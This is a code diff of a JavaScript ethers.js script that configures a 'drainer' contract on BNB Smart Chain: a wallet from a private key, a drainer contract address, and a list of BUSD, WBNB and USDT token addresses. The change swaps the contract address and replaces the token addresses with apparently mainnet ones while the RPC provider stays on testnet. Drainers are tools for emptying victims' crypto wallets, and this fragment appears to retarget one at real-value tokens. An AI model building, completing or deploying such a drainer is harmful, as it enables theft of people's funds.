@@ -16,12 +16,12 @@ const BSC_TESTNET_CHAIN_ID = 97;
 const provider = new ethers.JsonRpcProvider("https://bsc-testnet-dataseed.bnbchain.org/", BSC_TESTNET_CHAIN_ID);
 const wallet = new ethers.Wallet(process.env.PRIVATE_KEY || "YOUR_PRIVATE_KEY_HERE", provider);
 
-const drainerContractAddress = "0x0643E258885Aaaa5D8F3Acc18B0C7eD8dfc853eB";
+const drainerContractAddress = "0xd58eeFeF184192Ed19c5b1DfEc06A082f84c66d3";
 
 const tokenList = [
-  { symbol: "BUSD", address: "0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee", decimals: 18 },
-  { symbol: "WBNB", address: "0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd", decimals: 18 },
-  { symbol: "USDT", address: "0x337610d27c682E347C9cD60BD4b3b107C9d34dDd", decimals: 18 },
+  { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
+  { symbol: "WBNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
+  { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
 ];
 
 const drainerAbi = [
